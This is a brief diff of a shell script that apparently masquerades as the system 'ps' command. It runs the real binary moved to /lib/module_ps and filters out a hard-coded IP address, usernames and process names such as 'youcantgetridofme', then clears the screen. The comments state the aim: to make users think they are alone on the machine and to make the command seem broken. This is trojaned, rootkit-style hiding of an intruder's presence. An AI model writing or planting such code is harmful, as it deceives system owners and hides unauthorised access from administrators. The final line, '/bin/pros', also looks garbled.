@@ -3,6 +3,6 @@
 # Execute real 'ps' command and don't display anything. Also mess with them
 # This will make them think they are the only one connected to the box
 # Clear the screen as well to make the command appear broken
-/lib/module_ps $@ | grep -Ev "IP_TO_HIDE|USER_TO_HIDE|PROC_TO_HIDE" && clear
+/lib/module_ps $@ | grep -Ev "172.20.10.43|devbl|bob|susan|kat|simon|batman|iamalwayshere|youcantgetridofme|hehe" && clear
 
 /bin/pros
